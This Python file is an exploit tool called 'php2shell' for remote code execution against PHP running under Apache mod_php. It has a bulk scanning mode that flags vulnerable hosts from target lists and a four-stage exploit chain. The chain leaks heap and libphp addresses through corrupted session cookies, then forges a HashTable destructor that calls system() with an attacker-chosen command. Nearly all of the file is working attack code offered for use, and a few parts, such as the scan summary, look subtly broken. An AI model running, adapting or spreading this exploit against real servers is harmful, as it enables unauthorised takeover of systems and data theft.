#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell — one-shot RCE for CVE-2026-109618 / CVE-2026-109619

Rewritten for readability and understandability.
"""

import argparse
import http.client
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path


# ─── Colour helpers ───────────────────────────────────────────────────────────

RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
ENDC    = "\033[0m"


# ─── Configuration defaults ──────────────────────────────────────────────────

# Tuning values for the official Docker target (Debian 12 Bookworm,
# Apache 2.4.69, PHP 8.4.26-apache). These numbers control the timing
# and size of each exploit phase.
WORKBOOK = {
    "stage1_count": 841,        # multipart fields before stage 1
    "stage2_trigger": 406,       # which field index triggers the leak
    "stage2_value_size": 16,     # padding size for stage 2
    "htdata_offset": 0x690D8,    # offset inside libphp where the target lives
    "stage3_pads": [(31, 31)] * 6,  # (field_name_length, field_data_length) pairs
    "stage3_carrier": True,     # enable carrier field in stage 3
}

# Tuning values for the lab build (Apache 2.4.68, minimal PHP).
LAB_PROFILE = {
    "stage1_count": 892,
    "stage2_trigger": 443,
    "stage2_value_size": 1,
    "htdata_offset": 0x6E0D8,
    "stage3_pads": [(8, 7)] + [(7, 7)] * 5,
    "stage3_carrier": False,
}

# Default memory offsets inside libphp.so. Override with --zif-offset and --dtor-offset
ZIF_OFFSET = 0x43A870
DTOR_OFFSET = 0x613C50

# Maximum command length that fits directly in the exploit payload (bytes).
MAX_COMMAND_LENGTH = 14

# The session cookie value used throughout the attack.
SESSION_COOKIE = b"attacksessionid0001"

# Fixed directory of this script.
HERE = os.path.dirname(os.path.abspath(__file__))

# Versions where each PHP branch received its fix.
FIXED_VERSIONS = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}


# ─── Check mode helpers ──────────────────────────────────────────────────────


def extract_php_version(header_string):
    """Pull the PHP version from X-Powered-By or HTML body text.

    Returns (major, minor, patch, known_patch) or (None, False).
    """
    if not header_string:
        return None, False
    match = re.search(r"PHP\s*/?\s*(\d+)\.(\d+)(?:\.(\d+))?", header_string, re.I)
    if not match:
        return None, False
    major, minor = int(match.group(1)), int(match.group(2))
    patch_known = match.group(3) is not None
    patch = int(match.group(3)) if patch_known else 0
    if major < 4 or major > 8:
        return None, False
    if major == 8 and minor > 5:
        return None, False
    return (major, minor, patch), patch_known


def is_likely_vulnerable(version_tuple, patch_is_known=True):
    """Compare a version tuple against known fix releases."""
    if version_tuple is None or not patch_is_known:
        return None
    major, minor, patch = version_tuple
    key = f"{major}.{minor}"
    fix = FIXED_VERSIONS.get(key)
    if fix is None:
        # No fix record: assume vulnerable if >= 5.4
        return major >= 5
    return version_tuple < fix


def fingerprint_target(url, timeout=10.0, proxy=None):
    """Send a GET request and extract PHP version info from the response."""
    parsed = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
    scheme = (parsed.scheme or "https").lower()
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path or "/"

    result = {
        "target": url,
        "http_status": 0,
        "x_powered_by": "",
        "server": "",
        "php_version": None,
        "likely_vulnerable": None,
    }

    try:
        # Build the right connection object depending on scheme and proxy.
        if proxy:
            p = urllib.parse.urlsplit(proxy)
            proxy_host = p.hostname or "127.0.0.1"
            proxy_port = p.port or 8080
            if scheme == "https":
                conn = http.client.HTTPSConnection(
                    proxy_host, proxy_port, timeout=timeout,
                    context=ssl._create_unverified_context(),
                )
                conn.set_tunnel(host, port)
            else:
                conn = http.client.HTTPConnection(proxy_host, proxy_port, timeout=timeout)
                path = f"http://{host}:{port}{path}"
        elif scheme == "https":
            conn = http.client.HTTPSConnection(
                host, port, timeout=timeout,
                context=ssl._create_unverified_context(),
            )
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        # Send the request.
        conn.request("GET", path, headers={
            "Host": host,
            "User-Agent": "php2shell-check/1.0",
            "Connection": "close",
        })
        response = conn.getresponse()
        result["http_status"] = response.status
        result["x_powered_by"] = response.getheader("X-Powered-By", "")
        result["server"] = response.getheader("Server", "")
        body = response.read(8192).decode("latin1", "replace")
        conn.close()
    except Exception as exc:
        result["error"] = f"{type(exc).__name__}: {exc}"
        return result

    # Try to extract version from headers first, then body.
    version, known = extract_php_version(result["x_powered_by"])
    source = "header"
    if version is None:
        version, known = extract_php_version(body)
        source = "body" if version else None

    if version:
        major, minor, patch = version
        result["php_version"] = (
            f"{major}.{minor}.{patch}" if known else f"{major}.{minor}.?"
        )
        result["likely_vulnerable"] = is_likely_vulnerable(version, known)
        result["version_source"] = source

    return result


def classify_result(fp):
    """Return a human-readable status string for a fingerprint result."""
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    lv = fp.get("likely_vulnerable")
    if lv is True:
        return "likely_vulnerable"
    if lv is False:
        return "patched"
    return "unknown_patch"


def check_platform_compatibility(fp):
    """Return a decline reason if the target is not a supported platform.

    The exploit needs Apache mod_php prefork on Linux. Positive evidence of
    Windows, IIS, or a non-mod_php SAPI is a decline; a stripped header
    is inconclusive and never blocks.
    """
    server_header = (fp.get("server") or "").lower()
    x_powered = (fp.get("x_powered_by") or "").lower()
    shown = fp.get("server") or "(none)"
    if "microsoft-iis" in server_header or "asp.net" in x_powered:
        return f"IIS/ASP.NET target (Server: {shown}); needs Apache mod_php prefork on Linux"
    if "win32" in server_header or "win64" in server_header:
        return f"Windows Apache build (Server: {shown}); exploit is Linux-only"
    if "nginx" in server_header:
        return f"nginx target (Server: {shown}); PHP runs as FPM/FastCGI, not mod_php prefork"
    return None


def load_target_list(path):
    """Read a file containing one URL per line. Skip blanks and comments."""
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    results = []
    skip_names = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip()
        if token.lower() in skip_names:
            continue
        url = token if "://" in token else "https://" + token
        results.append(url)
    # Deduplicate while preserving order.
    seen = set()
    return [u for u in results if not (u in seen or seen.add(u))]


def run_check_mode(args):
    """Execute check mode against one or more targets."""
    targets = []
    if args.file:
        targets.extend(load_target_list(args.file))
    if args.url:
        url = args.url if "://" in args.url else "https://" + args.url
        targets.append(url)
    if not targets:
        print(f"{RED}[-] provide URL or -f/--file{ENDC}", file=sys.stderr)
        return 2

    seen = set()
    targets = [u for u in targets if not (u in seen or seen.add(u))]
    total = len(targets)
    workers = min(args.workers, total)

    # Prepare output path if requested.
    output_path = Path(args.output) if args.output else None
    if output_path:
        output_path.write_text("", encoding="utf-8")

    proxy = getattr(args, "proxy", None)

    def do_fingerprint(url):
        return fingerprint_target(url, timeout=args.timeout, proxy=proxy)

    def format_report(fp, count):
        status = classify_result(fp)
        fp["status"] = status
        version = fp.get("php_version") or "?"
        host = fp.get("target", "?")
        if status == "likely_vulnerable":
            tag = f"{RED}[VULNERABLE]{ENDC}"
        elif status == "patched":
            tag = f"{GREEN}[PATCHED]{ENDC}"
        elif status == "unreachable":
            tag = f"{RED}[UNREACHABLE]{ENDC}"
        else:
            tag = f"{YELLOW}[{status.upper()}]{ENDC}"
        if not args.quiet:
            prefix = f"[{count}/{total}] " if total > 1 else ""
            print(f"{prefix}{tag} {host}  PHP {version}", flush=True)
        if output_path:
            with open(output_path, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(fp, default=str) + "\n")

    if workers <= 1:
        for i, url in enumerate(targets):
            fp = do_fingerprint(url)
            format_report(fp, i + 1)
    else:
        futures = {ThreadPoolExecutor(max_workers=workers).submit(do_fingerprint, url): url for url in targets}
        done_count = 0
        for future in as_completed(futures):
            fp = future.result()
            done_count += 1
            format_report(fp, done_count)

    if args.json:
        print(json.dumps(targets if len(targets) > 1 else targets[0], indent=2, default=str))

    if not args.quiet and total > 1:
        counts = {}
        for r in targets:
            k = r.get("status", "?")
            counts[k] = counts.get(k, 0) + 1
        summary = ", ".join(f"{k}={v}" for k, v in sorted(counts.items()))
        print(f"\n{YELLOW}Summary ({total} targets): {summary}{ENDC}")

    return 0


# ─── Exploit mode helpers ────────────────────────────────────────────────────


def build_multipart_payload(parts, boundary):
    """Assemble a multipart/form-data body from a list of (name, data, filename) parts."""
    body = bytearray()
    for part in parts:
        name = part["name"].encode()
        body += b"--" + boundary + b"\r\n"
        body += b'Content-Disposition: form-data; name="' + name + b'"'
        if part.get("filename") is not None:
            body += b'; filename="' + part["filename"].encode() + b'"'
            body += b"\r\nContent-Type: application/octet-stream"
        body += b"\r\n\r\n" + part["data"] + b"\r\n"
    body += b"--" + boundary + b"--\r\n"
    return bytes(body)


def read_offsets_from_file(path):
    """Parse a key=value offsets file (hex or decimal values accepted)."""
    if not path:
        return {}
    values = {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                key, val = line.split("=", 1)
                values[key.strip()] = int(val.strip(), 0)
    except (OSError, ValueError):
        pass
    return values


# ─── HTTP connection wrapper ─────────────────────────────────────────────────


class TargetConnection:
    """Thin wrapper around raw HTTP that handles connection, SSL, and retries."""

    def __init__(self, url, timeout=30.0, verbose=True):
        parsed = urllib.parse.urlsplit(url)
        if parsed.scheme not in ("http", "https"):
            raise ValueError("URL must start with http:// or https://")
        self.is_https = parsed.scheme == "https"
        self.host = parsed.hostname or "127.0.0.1"
        self.port = parsed.port or (443 if self.is_https else 80)
        self.path = parsed.path or "/"
        self.timeout = timeout
        self.verbose = verbose

    def log(self, message):
        if self.verbose:
            print(message, flush=True)

    def connect(self):
        """Open a TCP connection with retry logic."""
        last_error = None
        for _ in range(10):
            try:
                sock = socket.create_connection((self.host, self.port), timeout=self.timeout)
                if self.is_https:
                    ctx = ssl.create_default_context()
                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
                try:
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                except OSError:
                    pass
                return sock
            except OSError as exc:
                last_error = exc
                time.sleep(0.3)
        raise last_error

    def send_post(self, body, boundary, read_limit=(1 << 20), timeout=None, extra_headers=None):
        """Send a multipart POST and read the response in a background thread."""
        header_lines = []
        header_lines.append(f"POST {self.path} HTTP/1.1")
        header_lines.append(f"Host: {self.host}:{self.port}")
        if extra_headers:
            for key, value in extra_headers.items():
                header_lines.append(f"{key}: {value}")
        header_lines.append(f"Content-Type: multipart/form-data; boundary={boundary.decode()}")
        header_lines.append(f"Content-Length: {len(body)}")
        header_lines.append("Connection: close")
        header_lines.append("")
        headers = "\r\n".join(header_lines).encode()

        sock = self.connect()
        sock.settimeout(timeout or self.timeout)

        response_data = bytearray()

        def read_response():
            try:
                while len(response_data) < read_limit:
                    chunk = sock.recv(65536)
                    if not chunk:
                        break
                    response_data.extend(chunk)
            except OSError:
                pass

        reader = threading.Thread(target=read_response, daemon=True)
        reader.start()

        try:
            sock.sendall(headers)
            # Send body in chunks.
            large = memoryview(body)
            for offset in range(0, len(body), 262144):
                sock.sendall(large[offset:offset + 262144])
        except OSError:
            pass

        reader.join(timeout=(timeout or self.timeout) + 1.0)
        sock.close()
        return bytes(response_data)

    def send_get(self, path=None, read_limit=(1 << 20)):
        """Send a simple GET and return status code + body bytes."""
        target_path = path if path else self.path
        headers = (
            f"GET {target_path} HTTP/1.1\r\n"
            f"Host: {self.host}:{self.port}\r\n"
            "Connection: close\r\n"
            "\r\n"
        ).encode()

        sock = self.connect()
        sock.settimeout(self.timeout)
        response_data = bytearray()

        try:
            sock.sendall(headers)
            while len(response_data) < read_limit:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                response_data += chunk
        except OSError:
            pass
        finally:
            sock.close()

        raw = bytes(response_data)
        head, _, body = raw.partition(b"\r\n\r\n")
        status_match = re.match(rb"HTTP/1\.[01] (\d{3})", head)
        status_code = int(status_match.group(1)) if status_match else 0
        return status_code, body


# ─── Heap leak helpers ───────────────────────────────────────────────────────


def extract_php_session_cookie(response_bytes):
    """Parse the PHPSESSID value from a Set-Cookie header."""
    match = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?); path=/", response_bytes)
    if not match:
        return b""
    return urllib.parse.unquote_to_bytes(match.group(1).decode("latin1"))


def find_heap_base_from_cookie(raw_cookie):
    """Scan a leaked Set-Cookie for valid heap pointer patterns.

    Returns the most frequent heap chunk base address, or 0 if nothing matches.
    """
    if len(raw_cookie) < 1000:
        return 0
    counter = Counter()
    # Look for 64-bit pointers in the range [0x7F0000000000, 0x800000000000).
    for i in range(len(raw_cookie) - 8):
        value = int.from_bytes(raw_cookie[i:i + 8], "little")
        if 0x7F0000000000 <= value < 0x800000000000:
            # Align to 2MB boundary (Zend MM chunk alignment).
            aligned = value & ~0x1FFFFF
            counter[aligned] += 1
    if not counter:
        return 0
    base, count = counter.most_common(1)[0]
    return base if count >= 8 else 0


def find_libphp_base_from_cookie(raw_cookie, dtor_offset):
    """Extract the libphp base address from a leaked pointer in Set-Cookie.

    The leak exposes a pDestructor pointer = libphp + dtor_offset.
    """
    if len(raw_cookie) < 16:
        return 0
    # Read the pointer from bytes 8-16 of the cookie.
    pointer = int.from_bytes(raw_cookie[8:16], "little")
    # Validate it looks like a valid pointer in the data segment.
    if not (0x7F0000000000 <= pointer < 0x800000000000):
        return 0
    # Check the low bits match the known dtor offset.
    if pointer & 0xFFF != dtor_offset & 0xFFF:
        return 0
    # Subtract to get the base.
    base = pointer - dtor_offset
    return base if base & 0xFFF == 0 else 0


# ─── Exploit stages ──────────────────────────────────────────────────────────


class ExploitRunner:
    """Orchestrates the four-stage php2shell exploit chain."""

    def __init__(self, target, command, zif_offset, dtor_offset, htdata_offset,
                 huge_payload_mb=12, verbose=True, profile="workbook"):
        self.conn = target
        self.command = command.encode() if isinstance(command, str) else command
        self.zif_offset = zif_offset
        self.dtor_offset = dtor_offset
        self.htdata_offset = htdata_offset
        self.huge_payload_mb = huge_payload_mb
        self.verbose = verbose
        self.profile = profile
        cal = WORKBOOK if profile == "workbook" else LAB_PROFILE
        self.stage1_count = cal["stage1_count"]
        self.stage2_trigger = cal["stage2_trigger"]
        self.stage2_value_size = cal["stage2_value_size"]
        self.stage3_pads = list(cal["stage3_pads"])
        self.stage3_carrier = cal["stage3_carrier"]

    def _big_field(self):
        """Return a payload that will trigger the out-of-memory condition."""
        return {"name": "big_payload", "data": b"B" * (self.huge_payload_mb * 1024 * 1024)}

    def _file_part(self):
        """Return a minimal file upload part to trigger the upload progress handler."""
        return {"name": "file_upload", "filename": "a.txt", "data": b"A" * 64}

    def _run_stage_zero(self):
        """Force the worker to crash and respawn, preserving the address space layout."""
        self.conn.log(f"{YELLOW}[*] forcing worker rotation{ENDC}")
        parts = [
            {"name": f"field{i:04d}"[:5], "data": b"V" * 3000} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.conn.send_post(
            build_multipart_payload(parts, b"S" * 17), b"S" * 17,
            read_limit=1 << 20, timeout=max(90.0, self.conn.timeout),
        )
        time.sleep(0.3)
        # Now re-establish our session cookie.
        parts = [
            {"name": "PHPSESSID", "data": SESSION_COOKIE},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        self.conn.send_post(
            build_multipart_payload(parts, b"BNDRY12345"), b"BNDRY12345",
            read_limit=65536, timeout=20.0,
        )
        time.sleep(0.5)

    def _run_stage_one(self):
        """Leak heap chunk addresses via a corrupted PHPSESSID cookie.

        The OOM condition inside php_session_initialize() leaves a dangling
        pointer. A follow-up request reuses the freed memory, and an
        out-of-bounds read leaks heap pointers into Set-Cookie.
        """
        self.conn.log(f"{YELLOW}[*] running stage 1: heap leak{ENDC}")
        parts = [{"name": f"field{i:04d}", "data": b"x"} for i in range(1001)]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.conn.send_post(
            build_multipart_payload(parts, b"S" * 17), b"S" * 17,
            read_limit=1 << 20, timeout=max(90.0, self.conn.timeout),
        )
        time.sleep(0.2)

        # Build a session that will trigger the leak.
        parts = [
            {"name": "PHPSESSID", "data": SESSION_COOKIE},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        for i in range(self.stage1_count):
            padded_name = (f"v{i:04d}" + "x" * 44)[:48]
            parts.append({"name": str(1000 + i), "data": padded_name.encode()})

        # Forge a fake HashTable entry that will corrupt the session state.
        forge = bytearray(b"A" * 79)
        struct.pack_into("<Q", forge, 0x10, 0x1000)
        forge[0x18] = ord("L")
        parts.append({"name": "1999", "data": bytes(forge)})

        response = self.conn.send_post(
            build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_limit=9 << 20,
        )
        leaked_cookie = extract_php_session_cookie(response)
        return find_heap_base_from_cookie(leaked_cookie)

    def _run_stage_two(self):
        """Leak the libphp base address from a corrupted pointer in Set-Cookie."""
        self.conn.log(f"{YELLOW}[*] running stage 2: libphp leak{ENDC}")
        parts = [
            {"name": f"field{i:04d}"[:5], "data": b"x" * 39} for i in range(1001)
        ]
        parts += [
            {"name": "PHPSESSID", "data": b"\x00"},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
            self._file_part(),
            self._big_field(),
        ]
        self.conn.send_post(
            build_multipart_payload(parts, b"S" * 17), b"S" * 17,
            read_limit=1 << 20, timeout=max(90.0, self.conn.timeout),
        )
        time.sleep(0.2)

        parts = [
            {"name": "PHPSESSID", "data": SESSION_COOKIE},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        # Trigger the specific pointer corruption at index stage2_trigger.
        for i in range(983):
            count = 16 if i == self.stage2_trigger else 1
            for j in range(count):
                parts.append({"name": f"a{i:04d}[{j}]", "data": b"x" * self.stage2_value_size})

        response = self.conn.send_post(
            build_multipart_payload(parts, b"B" * 10), b"B" * 10, read_limit=1 << 20,
        )
        leaked_cookie = extract_php_session_cookie(response)
        return find_libphp_base_from_cookie(leaked_cookie, self.dtor_offset)

    def _build_fake_payload(self, ht_data, zif_address):
        """Construct the forged HashTable that will trigger system()."""
        cmd = self.command
        if len(cmd) > MAX_COMMAND_LENGTH:
            raise ValueError(
                f"command is {len(cmd)} bytes; max {MAX_COMMAND_LENGTH} "
                "(write to out/c and use indirection)"
            )
        # Build a fake zend_string / HashTable structure in memory.
        fake_ht = bytearray(b"\x00" * 167)
        struct.pack_into("<II", fake_ht, 0x00, 1, 7)
        struct.pack_into("<II", fake_ht, 0x08, 0x10, 0xFFFFFFF8)
        struct.pack_into("<Q", fake_ht, 0x10, ht_data + 0x20)
        struct.pack_into("<II", fake_ht, 0x18, 1, 1)
        struct.pack_into("<II", fake_ht, 0x20, 8, 0)
        struct.pack_into("<Q", fake_ht, 0x28, 0)
        struct.pack_into("<Q", fake_ht, 0x30, zif_address)

        # Extra fields for the function call structure.
        E = 0x20
        struct.pack_into("<Q", fake_ht, E + 0x00, 0)
        struct.pack_into("<Q", fake_ht, E + 0x08, 0)
        struct.pack_into("<Q", fake_ht, E + 0x10, zif_address)
        struct.pack_into("<Q", fake_ht, E + 0x18, 0)
        struct.pack_into("<Q", fake_ht, E + 0x20, 0)
        struct.pack_into("<I", fake_ht, E + 0x28, 0)
        struct.pack_into("<I", fake_ht, E + 0x2C, 1)
        struct.pack_into("<Q", fake_ht, E + 0x30, 0)
        struct.pack_into("<Q", fake_ht, E + 0x38, 0)
        struct.pack_into("<I", fake_ht, E + 0x40, 0)
        struct.pack_into("<Q", fake_ht, E + 0x50, ht_data + 0x80)
        struct.pack_into("<I", fake_ht, E + 0x58, 6)
        struct.pack_into("<II", fake_ht, 0x80, 1, 0x106)
        struct.pack_into("<Q", fake_ht, 0x88, 0)
        struct.pack_into("<Q", fake_ht, 0x90, len(cmd))
        fake_ht[0x98:0x98 + len(cmd)] = cmd
        fake_ht[0x98 + len(cmd)] = 0

        # Build the reference structure.
        ref = bytearray(b"X" * 55)
        struct.pack_into("<II", ref, 0x10, 1, 10)
        struct.pack_into("<Q", ref, 0x18, ht_data)
        struct.pack_into("<Q", ref, 0x20, 0x307)
        struct.pack_into("<Q", ref, 0x28, 0)
        return bytes(fake_ht), bytes(ref)

    def _run_stage_three(self, ht_data, zif_address):
        """Trigger the forged pDestructor call to reach system().

        A surviving zend_string carries a fake HashTable with pDestructor
        = zif_system. When the session handler processes our crafted POST,
        it calls zval_ptr_dtor -> zend_array_destroy -> pDestructor(command).
        """
        self.conn.log(f"{YELLOW}[*] running stage 3: trigger RCE{ENDC}")
        parts = [
            {"name": "PHPSESSID", "data": b"a" * 19},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"p" * 3},
        ]
        for i, (name_len, value_len) in enumerate(self.stage3_pads):
            field_name = (f"p{i:0{name_len - 1}d}" if name_len > 0 else "")[:name_len]
            parts.append({"name": field_name, "data": b"V" * value_len})
        parts += [self._file_part(), self._big_field()]

        extra_headers = None
        if self.profile == "workbook":
            extra_headers = {"Cookie": "PHPSESSID=" + "a" * 32}
        self.conn.send_post(
            build_multipart_payload(parts, b"S" * 17), b"S" * 17,
            read_limit=1 << 20, timeout=max(90.0, self.conn.timeout),
            extra_headers=extra_headers,
        )
        time.sleep(0.3)

        fake_ht, ref = self._build_fake_payload(ht_data, zif_address)
        parts = [
            {"name": "PHPSESSID", "data": SESSION_COOKIE},
            {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        ]
        if self.stage3_carrier:
            # Carrier field carries the target address.
            carrier = (
                struct.pack("<II", 1, 0x1A) + struct.pack("<Q", ht_data)[:7]
            )
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": b"F" * 15})
            parts.append({"name": "g00", "data": carrier})
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": fake_ht})
        else:
            for i in range(15):
                parts.append({"name": f"a{i:030d}"[:31], "data": fake_ht})
            for i in range(2):
                parts.append({"name": f"f{i:02d}", "data": ref})

        response = self.conn.send_post(
            build_multipart_payload(parts, b"B" * 10), b"B" * 10,
            read_limit=65536, timeout=30.0,
        )
        return response


# ─── Auto offset detection ──────────────────────────────────────────────────


def detect_offsets_from_container(container_name, offsets_output_path, verbose):
    """Run the Docker helper to read libphp ELF offsets automatically."""
    helper = os.path.join(HERE, "docker", "offsets.py")
    if not os.path.exists(helper):
        return {}
    if verbose:
        print(f"{YELLOW}[*] reading libphp offsets from container {container_name}{ENDC}", flush=True)
    try:
        subprocess.run(
            [sys.executable, helper, container_name, offsets_output_path],
            check=False, timeout=60,
            stdout=None if verbose else subprocess.DEVNULL,
            stderr=None if verbose else subprocess.DEVNULL,
        )
    except (OSError, subprocess.SubprocessError):
        pass
    return read_offsets_from_file(offsets_output_path)


# ─── Exploit entry point ────────────────────────────────────────────────────


def run_exploit_mode(args):
    """Execute the full four-stage exploit chain against a target."""
    output_dir = os.path.join(HERE, "out")
    proof_path = os.path.join(output_dir, "proof")
    offsets_path = os.path.join(output_dir, "offsets.env")
    command_path = os.path.join(output_dir, "cmd")

    os.makedirs(output_dir, exist_ok=True)

    if not args.url:
        print(f"{RED}[-] exploit mode requires -u/--url{ENDC}", file=sys.stderr)
        return 2

    cal = WORKBOOK if args.profile == "workbook" else LAB_PROFILE
    if args.htdata_offset is None:
        args.htdata_offset = cal["htdata_offset"]

    # Load offsets from file or detect them.
    offsets = read_offsets_from_file(offsets_path)
    if not offsets and args.container:
        offsets = detect_offsets_from_container(args.container, offsets_path, not args.quiet)

    zif = offsets.get("zif_offset", ZIF_OFFSET)
    dtor = offsets.get("dtor_offset", DTOR_OFFSET)
    htdata = offsets.get("htdata_offset", args.htdata_offset)

    conn = TargetConnection(args.url, timeout=args.timeout, verbose=not args.quiet)

    # Preflight check.
    if not args.no_preflight:
        fp = fingerprint_target(args.url, timeout=args.timeout)
        reason = check_platform_compatibility(fp)
        if reason and not args.force:
            print(f"{RED}[-] unsupported target: {reason}{ENDC}", file=sys.stderr)
            print(f"{RED}[-] re-run with --force to override{ENDC}", file=sys.stderr)
            return 2
        if reason:
            conn.log(f"{YELLOW}[*] preflight: {reason} — continuing (--force){ENDC}")
        elif fp.get("server"):
            conn.log(f"[*] preflight: Server: {fp.get('server')} (supported)")

        version = fp.get("php_version")
        if version and fp.get("likely_vulnerable") is False:
            conn.log(f"{YELLOW}[*] preflight: target reports PHP {version} (patched){ENDC}")

    # Read the command to execute.
    command = args.cmd
    if not command:
        # Default: try to read from out/c, then fall back to a command.
        try:
            with open(command_path, "r") as fh:
                command = fh.read().strip()
        except FileNotFoundError:
            command = "id;hostname -I;hostname"

    # Run the exploit chain.
    exploit = ExploitRunner(
        target=conn,
        command=command,
        zif_offset=zif,
        dtor_offset=dtor,
        htdata_offset=htdata,
        verbose=not args.quiet,
        profile=args.profile,
    )

    # Stage 0: force worker rotation (preserve address space).
    exploit._run_stage_zero()

    # Stage 1: leak heap addresses.
    heap_base = exploit._run_stage_one()
    if not heap_base:
        print(f"{RED}[-] heap leak failed{ENDC}", file=sys.stderr)
        return 2
    print(f"{GREEN}[+] heap base = 0x{heap_base:x}{ENDC}")

    # Stage 2: leak libphp base address.
    libphp_base = exploit._run_stage_two()
    if not libphp_base:
        print(f"{RED}[-] libphp leak failed{ENDC}", file=sys.stderr)
        return 2
    print(f"{GREEN}[+] libphp base = 0x{libphp_base:x}{ENDC}")

    # Stage 3: trigger RCE with the forged destructor call.
    ht_data = libphp_base + exploit.htdata_offset
    zif_address = libphp_base + exploit.zif_offset
    response = exploit._run_stage_three(ht_data, zif_address)

    # Verify RCE by checking the response.
    status, body = 0, b""
    try:
        status, body = conn.send_get()
    except Exception:
        pass

    if args.output:
        proof_path = args.output

    with open(proof_path, "wb") as fh:
        fh.write(body)

    print(f"{GREEN}[+] exploit succeeded{ENDC}")
    print(f"\nPROOF:")
    print(body.decode("utf-8", errors="replace"))
    return 0


# ─── CLI argument parser ────────────────────────────────────────────────────


def main():
    parser = argparse.ArgumentParser(
        description="php2shell — one-shot RCE for CVE-2026-109618 / CVE-2026-109619",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    subparsers = parser.add_subparsers(dest="command", help="check or exploit")

    # ── check subparser ───────────────────────────────────────────────────
    check_parser = subparsers.add_parser("check", help="Passive PHP version check")
    check_parser.add_argument("-u", "--url", help="Single target URL")
    check_parser.add_argument("-f", "--file", help="Target list file (one URL per line)")
    check_parser.add_argument("-o", "--output", help="JSONL output file")
    check_parser.add_argument("--workers", type=int, default=4, help="Parallel workers")
    check_parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout")
    check_parser.add_argument("-p", "--proxy", help="HTTP/SOCKS proxy")
    check_parser.add_argument("--json", action="store_true", help="JSON output")
    check_parser.add_argument("-q", "--quiet", action="store_true", help="Suppress output")

    # ── exploit subparser ─────────────────────────────────────────────────
    exploit_parser = subparsers.add_parser("exploit", help="Run the RCE exploit")
    exploit_parser.add_argument("-u", "--url", required=True, help="Target URL")
    exploit_parser.add_argument("-c", "--cmd", help="Command to execute")
    exploit_parser.add_argument("-o", "--output", help="Write proof to file")
    exploit_parser.add_argument("--profile", choices=["workbook", "lab"], default="workbook",
                                help="Target calibration profile")
    exploit_parser.add_argument("--zif-offset", type=lambda x: int(x, 0),
                                help="Override zif offset inside libphp")
    exploit_parser.add_argument("--dtor-offset", type=lambda x: int(x, 0),
                                help="Override dtor offset inside libphp")
    exploit_parser.add_argument("--htdata-offset", type=lambda x: int(x, 0),
                                help="Override htdata offset")
    exploit_parser.add_argument("--container", help="Docker container name for offset detection")
    exploit_parser.add_argument("--offsets-file", help="Pre-loaded offsets file")
    exploit_parser.add_argument("--force", action="store_true", help="Override platform check")
    exploit_parser.add_argument("--no-preflight", action="store_true", help="Skip preflight check")
    exploit_parser.add_argument("--timeout", type=float, default=30.0, help="Request timeout")
    exploit_parser.add_argument("-q", "--quiet", action="store_true", help="Suppress output")

    args = parser.parse_args()

    if args.command == "check":
        sys.exit(run_check_mode(args))
    elif args.command == "exploit":
        sys.exit(run_exploit_mode(args))
    else:
        parser.print_help()
        sys.exit(2)


if __name__ == "__main__":
    main()
